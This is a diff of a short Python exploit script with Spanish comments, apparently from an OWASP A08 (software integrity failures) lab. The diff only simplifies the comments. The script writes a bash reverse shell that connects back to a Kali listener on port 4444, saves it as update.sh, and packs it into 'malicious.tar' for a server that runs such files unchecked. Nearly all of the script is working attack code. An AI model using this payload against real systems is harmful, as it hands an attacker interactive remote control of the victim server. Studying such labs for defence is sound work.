@@ -1,11 +1,11 @@
 import tarfile
 import os
 
-KALI = "<IP_KALI>"   # IP de tu VM Kali, donde corre el listener
+KALI = "<IP_KALI>"   # IP de tu Kali, donde espera el listener
 PUERTO = 4444
 
-# Reverse shell: cuando el servidor víctima ejecute este script, abrirá una
-# conexión de vuelta a Kali entregando una shell interactiva.
+# Este es el "programa dañino": cuando el servidor lo ejecute, se va a conectar
+# de vuelta a nuestra Kali y nos entrega el control (una shell).
 payload = f"""#!/bin/bash
 bash -i >& /dev/tcp/{KALI}/{PUERTO} 0>&1
 """
@@ -14,8 +14,8 @@ os.makedirs("out", exist_ok=True)
 with open("out/update.sh", "w", newline="\n") as f:
     f.write(payload)
 
-# El procesador vulnerable ejecuta automáticamente cualquier "update.sh" que
-# encuentre dentro del paquete, sin verificar firma ni integridad (A08).
+# Metemos ese programa dentro de un paquete .tar. El servidor vulnerable ejecuta
+# solo cualquier "update.sh" que venga adentro, sin revisar nada.
 with tarfile.open("out/malicious.tar", "w") as t:
     t.add("out/update.sh", arcname="update.sh")
 
